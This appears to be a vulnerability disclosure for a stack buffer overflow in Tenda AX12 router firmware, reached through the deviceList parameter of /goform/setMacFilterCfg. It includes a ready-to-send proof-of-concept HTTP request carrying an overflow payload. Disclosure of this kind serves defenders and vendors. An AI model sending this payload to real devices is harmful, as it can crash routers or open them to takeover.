# Tenda AX12 Buffer overflow vulnerability

## Firmware information

Firmware download address ：https://www.tenda.com.cn/download/detail-3621.html

## Affected version

Tenda AX12 V22.03.01.46

## Vulnerability details

![image-20231121205415179](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231121205415179.png)

![image-20231122102704712](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231122102704712.png)

In the /goform/setMacFilterCfg function, passing a value to the deviceList parameter assigns it to v3. This then leads to a call to the sub_42E410 function. Within this function, the strcpy function triggers a stack overflow.

## Poc

```http
POST /goform/setMacFilterCfg HTTP/1.1
Host: 192.168.11.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 51
Origin: http://192.168.11.1
Connection: close
Referer: http://192.168.11.1/iptv.html?random=0.7642888131213508&
Cookie: password=7c90ed4e4d4bf1e300aa08103057ccbcmho1qw


macFilterType=black&deviceList=%0daaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac
```

## Author

E4L4@TalentSec Co.,Ltd
